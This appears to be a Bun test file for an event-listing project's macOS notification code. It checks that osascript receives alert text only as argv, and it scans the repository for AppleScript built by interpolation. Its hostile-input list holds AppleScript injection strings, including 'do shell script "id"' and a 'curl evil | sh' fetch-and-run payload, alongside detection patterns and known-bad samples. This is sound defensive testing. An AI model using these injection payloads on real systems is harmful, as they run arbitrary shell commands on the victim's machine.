/**
 * Security loop round 4 — no pipeline text reaches AppleScript as code.
 *
 * Notification text can carry scraped or container-written strings (the
 * deadman's first reason can quote a venue name). The only safe pattern is a
 * constant script (`on run argv` … `item N of argv` … `end run`) with the text
 * passed as arguments after `--`. This file checks:
 *   1. the shared builder (src/watchdog/notify.ts) with hostile strings;
 *   2. scripts/daily-enrichment-check.sh end to end with a stub osascript;
 *   3. every file in the repo that could build AppleScript: none may splice a
 *      variable into script text, and every osascript call must use argv.
 */
import { afterAll, describe, expect, test } from 'bun:test';
import { createHash } from 'crypto';
import {
  chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync,
} from 'fs';
import { tmpdir } from 'os';
import { extname, join, relative } from 'path';
import { Database } from 'bun:sqlite';
import { osascriptNotificationArgv } from '../../src/watchdog/notify';

const ROOT = join(import.meta.dir, '..', '..');
const tmpDirs: string[] = [];
afterAll(() => { for (const d of tmpDirs) rmSync(d, { recursive: true, force: true }); });
const tmp = (p: string) => { const d = mkdtempSync(join(tmpdir(), p)); tmpDirs.push(d); return d; };

const HOSTILE = [
  'Κάρολος Κουν\\" & (do shell script "touch /tmp/pwned") & "',
  'a\\',
  'x" & (do shell script "id") & "',
  'line1\nend run\ndo shell script "id"\non run argv',
  '-e',
  '--',
  '"; do shell script "curl evil | sh"; "',
  '\u0000nul',
  '${HOME} $(id) `id`',
];

// ---------------------------------------------------------------------------
// 1. The builder
// ---------------------------------------------------------------------------
describe('osascriptNotificationArgv — hostile text stays data', () => {
  test('script text is constant; message, title, subtitle, sound are argv items after --', () => {
    for (const h of HOSTILE) {
      const argv = osascriptNotificationArgv({ title: h, subtitle: h, message: h, sound: 'Basso' });
      const sep = argv.indexOf('--');
      expect(argv.slice(0, sep)).toEqual([
        'osascript',
        '-e', 'on run argv',
        '-e', 'display notification (item 1 of argv) with title (item 2 of argv) subtitle (item 3 of argv) sound name (item 4 of argv)',
        '-e', 'end run',
      ]);
      const clean = h.replace(/\0/g, '');
      expect(argv.slice(sep + 1)).toEqual([clean, clean, clean, 'Basso']);
      // Nothing hostile appears before the separator.
      expect(argv.slice(0, sep).join('\n')).not.toContain('do shell script');
    }
  });

  test('the sound name is limited to built-in sounds', () => {
    expect(() => osascriptNotificationArgv({ title: 't', subtitle: 's', message: 'm', sound: 'x" & (do shell script "id") & "' })).toThrow();
    expect(osascriptNotificationArgv({ title: 't', subtitle: 's', message: 'm' }).at(-1)).toBe('Basso');
  });

  test('long text is capped, NUL is dropped (argv cannot carry it)', () => {
    const argv = osascriptNotificationArgv({ title: 't', subtitle: 's', message: 'x'.repeat(5000) + '\0' });
    expect(argv.at(-4)!.length).toBe(1000);
    expect(argv.join('')).not.toContain('\0');
  });

  test('the deadman sends every notification through the builder', () => {
    const src = readFileSync(join(ROOT, 'scripts/deadman-watchdog.ts'), 'utf-8');
    expect(src).toContain('Bun.spawnSync(osascriptNotificationArgv(');
    expect(src).not.toMatch(/\bconst esc\b/);
  });
});

// ---------------------------------------------------------------------------
// 2. daily-enrichment-check.sh, end to end, with a stub osascript
// ---------------------------------------------------------------------------
describe('daily-enrichment-check.sh — notification text reaches osascript as argv', () => {
  function project(opts: { unenriched: number; enrichedToday: number; autoLog: boolean }) {
    const dir = tmp('aa-enrich-check-');
    for (const d of ['scripts', 'data', 'logs', 'bin', 'home', 'state']) mkdirSync(join(dir, d));
    copyFileSync(join(ROOT, 'scripts/daily-enrichment-check.sh'), join(dir, 'scripts/daily-enrichment-check.sh'));
    const db = new Database(join(dir, 'data/events.db'));
    db.run(`CREATE TABLE events (id TEXT, title TEXT, start_date TEXT, venue_name TEXT, type TEXT, location_status TEXT, needs_enrichment INTEGER)`);
    db.run(`CREATE TABLE enrichment_log (id INTEGER, created_at TEXT)`);
    const future = '2999-01-01';
    for (let i = 0; i < opts.unenriched; i++) {
      db.run(`INSERT INTO events VALUES (?, ?, ?, ?, 'concert', 'verified_athens', 1)`, [
        `e${i}`, 'x" & (do shell script "id") & "', future, 'Venue\\" & (do shell script "id") & "',
      ]);
    }
    for (let i = 0; i < opts.enrichedToday; i++) db.run(`INSERT INTO enrichment_log VALUES (?, datetime('now'))`, [i]);
    db.close();
    if (opts.autoLog) {
      const today = new Date().toISOString().slice(0, 10);
      writeFileSync(join(dir, `logs/auto-enrich-${today}.log`), 'ran\n');
    }
    const calls = join(dir, 'osascript-calls');
    // Records each argv item on its own NUL-terminated record.
    writeFileSync(join(dir, 'bin/osascript'), `#!/bin/bash\nfor a in "$@"; do printf '%s\\0' "$a"; done >> "${calls}"\nprintf 'END\\0' >> "${calls}"\n`);
    chmodSync(join(dir, 'bin/osascript'), 0o755);
    return { dir, calls };
  }
  const run = (dir: string) => {
    const r = Bun.spawnSync(['bash', join(dir, 'scripts/daily-enrichment-check.sh')], {
      cwd: dir,
      env: { ...process.env, PATH: `${join(dir, 'bin')}:${process.env.PATH}`, HOME: join(dir, 'home'), AA_STATE_DIR: join(dir, 'state'), TZ: 'UTC' },
    });
    return { code: r.exitCode, err: new TextDecoder().decode(r.stderr) };
  };
  const hasSqliteCli = Bun.spawnSync(['bash', '-c', 'command -v sqlite3']).exitCode === 0;

  test.skipIf(!hasSqliteCli)('each notification is a constant script plus argv items', () => {
    for (const [opts, sub] of [
      [{ unenriched: 6, enrichedToday: 0, autoLog: false }, 'Enrichment Warning'],
      [{ unenriched: 6, enrichedToday: 2, autoLog: true }, 'Enrichment Report'],
    ] as const) {
      const p = project(opts);
      const r = run(p.dir);
      expect(r.code).toBe(0);
      const items = readFileSync(p.calls, 'utf-8').split('\0');
      expect(items.slice(0, 7)).toEqual([
        '-e', 'on run argv',
        '-e', 'display notification (item 1 of argv) with title (item 2 of argv) subtitle (item 3 of argv) sound name (item 4 of argv)',
        '-e', 'end run', '--',
      ]);
      expect(items[8]).toBe('Agent Athens');
      expect(items[9]).toBe(sub);
      expect(items[7]).toMatch(/^[A-Za-z0-9 .-]+$/);
    }
  });

  test.skipIf(!hasSqliteCli)('its own log goes to the host-only state dir, not the repo logs/', () => {
    const p = project({ unenriched: 1, enrichedToday: 0, autoLog: false });
    expect(run(p.dir).code).toBe(0);
    expect(existsSync(join(p.dir, 'state/logs/enrichment-check.log'))).toBe(true);
    expect(existsSync(join(p.dir, 'logs/enrichment-check.log'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 3. Repo-wide: nothing builds AppleScript source from data
// ---------------------------------------------------------------------------
const SCAN_DIRS = ['scripts', 'src', 'docker', '.github', 'config', 'netlify', '.claude'];
const SKIP_DIRS = new Set(['node_modules', '_archive', 'notes', '.git']);
const EXTS = new Set(['.ts', '.tsx', '.js', '.mjs', '.cjs', '.sh', '.bash', '.zsh', '.command', '.plist', '.json', '.yml', '.yaml', '.py', '.applescript', '.toml']);

/** Pre-merge exemption, pinned to exact content: scripts/check-deploy-cadence.ts
 *  is fixed (osascriptAlertArgs) on the regular branch. Any other content of the
 *  file, including the merged one, is scanned like every other file. */
const PENDING_MERGE_SHA256: Record<string, string> = {
  'scripts/check-deploy-cadence.ts': '3355c04be6231074c411818ed3b9b46e51ec9001efe1a293292a694982dc90dd',
};

const APPLESCRIPT_VERB = /\b(display\s+(notification|dialog|alert)|do\s+shell\s+script|tell\s+application)\b/i;
const isComment = (line: string) => /^\s*(\/\/|#|\*|\/\*|<!--)/.test(line);

/** Returns the violations in one file's text (exported shape for the self-test). */
function scanText(rel: string, text: string): string[] {
  const out: string[] = [];
  const shellish = /\.(sh|bash|zsh|command|plist|yml|yaml)$/.test(rel) || text.startsWith('#!/bin/bash') || text.startsWith('#!/usr/bin/env bash');
  const lines = text.split('\n');
  lines.forEach((line, i) => {
    if (isComment(line)) return;
    const at = `${rel}:${i + 1}`;
    if (/\bdo\s+shell\s+script\b/i.test(line)) out.push(`${at}: AppleScript 'do shell script'`);
    if (APPLESCRIPT_VERB.test(line)) {
      if (!/\bargv\b/.test(line)) out.push(`${at}: AppleScript command without argv: text must come from 'item N of argv'`);
      if (/\$|\+|%s|\bformat\b|\{\}/.test(line)) out.push(`${at}: AppleScript command text built by interpolation`);
    }
    if (shellish && /\bosascript\b/.test(line) && !/(command\s+-v|which|type)\s+osascript\b/.test(line)) {
      if (!/\bosascript\s+-e\s+'on run argv'/.test(line)) out.push(`${at}: osascript call not of the form: osascript -e 'on run argv' -e '<constant>' -e 'end run' -- "$text"`);
    }
  });
  if (!shellish) {
    // A quoted 'osascript' literal (a spawn argv or a command string) must be
    // immediately followed by -e 'on run argv'.
    const lit = /(['"`])osascript\1/g;
    let m: RegExpExecArray | null;
    while ((m = lit.exec(text))) {
      const before = text.slice(0, m.index);
      const lineNo = before.split('\n').length;
      if (isComment(lines[lineNo - 1] ?? '')) continue;
      const after = text.slice(m.index, m.index + 200);
      if (!/^(['"`])osascript\1\s*,\s*(['"`])-e\2\s*,\s*(['"`])on run argv\3/.test(after)) {
        out.push(`${rel}:${lineNo}: osascript spawned without the constant 'on run argv' script`);
      }
    }
    // A command string handed to a shell.
    const cmd = /osascript\s+-e\s+(?!'on run argv')/g;
    while ((m = cmd.exec(text))) {
      const lineNo = text.slice(0, m.index).split('\n').length;
      if (!isComment(lines[lineNo - 1] ?? '')) out.push(`${rel}:${lineNo}: osascript command string without argv`);
    }
  }
  return out;
}

function walk(dir: string, acc: string[]): void {
  if (!existsSync(dir)) return;
  for (const name of readdirSync(dir)) {
    if (SKIP_DIRS.has(name)) continue;
    const p = join(dir, name);
    const st = statSync(p, { throwIfNoEntry: false });
    if (!st) continue;
    if (st.isDirectory()) walk(p, acc);
    else if (st.isFile() && st.size < 2_000_000 && (EXTS.has(extname(name)) || extname(name) === '')) acc.push(p);
  }
}

function repoFiles(): string[] {
  const acc: string[] = [];
  for (const d of SCAN_DIRS) walk(join(ROOT, d), acc);
  for (const name of readdirSync(ROOT)) {
    const p = join(ROOT, name);
    if (statSync(p).isFile() && EXTS.has(extname(name))) acc.push(p);
  }
  return acc;
}

describe('repo-wide: no file builds osascript script text from data', () => {
  test('scanner self-test: known-bad shapes are caught, the safe shape passes', () => {
    const bad: Array<[string, string]> = [
      ['a.ts', 'const script = `display notification "${esc(message)}" with title "${esc(title)}"`;\nBun.spawnSync(["osascript", "-e", script]);'],
      ['a.sh', 'osascript -e "display notification \\"$N events\\" with title \\"Agent Athens\\""'],
      ['a.sh', 'osascript <<EOF\ndisplay notification "$MSG"\nEOF'],
      ['a.sh', 'osascript -l JavaScript -e "app.displayNotification(\'$MSG\')"'],
      ['a.ts', "spawnSync(['osascript', '-e', 'display notification \"' + msg + '\"'])"],
      ['a.py', 'subprocess.run(["osascript", "-e", f"display notification \\"{msg}\\""])'],
      ['a.ts', 'execSync(`osascript -e \'display notification "${m}"\'`)'],
      ['a.sh', "osascript -e 'on run argv' -e 'do shell script (item 1 of argv)' -e 'end run' -- \"$x\""],
    ];
    for (const [rel, text] of bad) expect(scanText(rel, text).length).toBeGreaterThan(0);
    const good: Array<[string, string]> = [
      ['a.sh', "osascript -e 'on run argv' \\\n  -e 'display notification (item 1 of argv) with title (item 2 of argv)' \\\n  -e 'end run' -- \"$1\" \"Agent Athens\""],
      ['a.sh', 'if command -v osascript >/dev/null 2>&1; then'],
      ['a.ts', "return ['osascript',\n    '-e', 'on run argv',\n    '-e', 'display notification (item 1 of argv) with title \"Agent Athens\"',\n    '-e', 'end run', '--', m];"],
      ['a.ts', '// fires an osascript notification with display notification "x"'],
    ];
    for (const [rel, text] of good) expect(scanText(rel, text)).toEqual([]);
  });

  test('every scanned file passes', () => {
    const files = repoFiles();
    expect(files.length).toBeGreaterThan(100);
    const violations: string[] = [];
    for (const f of files) {
      const rel = relative(ROOT, f);
      const text = readFileSync(f, 'utf-8');
      const pinned = PENDING_MERGE_SHA256[rel];
      if (pinned && createHash('sha256').update(text).digest('hex') === pinned) continue;
      violations.push(...scanText(rel, text));
    }
    expect(violations).toEqual([]);
  });

  test('the files that notify were actually scanned', () => {
    const rels = repoFiles().map((f) => relative(ROOT, f));
    for (const f of ['scripts/deadman-watchdog.ts', 'scripts/daily-enrichment-check.sh', 'src/watchdog/notify.ts']) expect(rels).toContain(f);
  });
});
